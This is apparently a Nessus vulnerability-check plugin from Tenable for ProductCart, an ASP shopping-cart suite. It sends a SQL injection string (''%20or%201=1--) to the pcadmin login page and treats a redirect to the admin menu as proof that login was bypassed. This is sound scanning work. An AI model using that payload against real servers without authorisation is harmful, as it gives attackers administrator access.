# 
# (C) Tenable Network Security
#

if (description)
{
 script_id(11785);
 script_cve_id("CVE-2003-0522", "CVE-2003-0523", "CVE-2003-1304");
 script_bugtraq_id(8103, 8105, 8108, 8112);
 script_version ("$Revision: 1.7 $");

 script_name(english:"ProductCart SQL Injection");
 desc["english"] = "
Synopsis :

The remote web server contains an ASP application that is affected by
multiple flaws. 

Description :

The remote host is using the ProductCart software suite. 

This set of CGIs is vulnerable to a SQL injection bug which may allow
an attacker to take the control of the server as an administrator.  In
addition, the application is susceptible various file disclosure and
cross-site scripting attacks. 

See also :

http://archives.neohapsis.com/archives/bugtraq/2003-07/0030.html
http://archives.neohapsis.com/archives/bugtraq/2003-07/0057.html
http://archives.neohapsis.com/archives/fulldisclosure/2003-q3/0081.html

Solution : 

Unknown at this time.

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";

 script_description(english:desc["english"]);
 script_summary(english:"Determine if ProductCart is vulnerable to a sql injection attack");
 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses", francais:"Abus de CGI");
 script_copyright(english:"This script is Copyright (C) 2003-2006 Tenable Network Security");
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if ( ! can_host_asp(port:port) ) exit(0);

foreach dir (cgi_dirs())
{
 req = http_get(item:dir + "/pcadmin/login.asp?idadmin=''%20or%201=1--", port:port);
 res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 if ( res == NULL ) exit(0);
 
 if(egrep(pattern:"^Location: menu\.asp", string:res))
 {
  security_note(port);
  exit(0);
 }
}
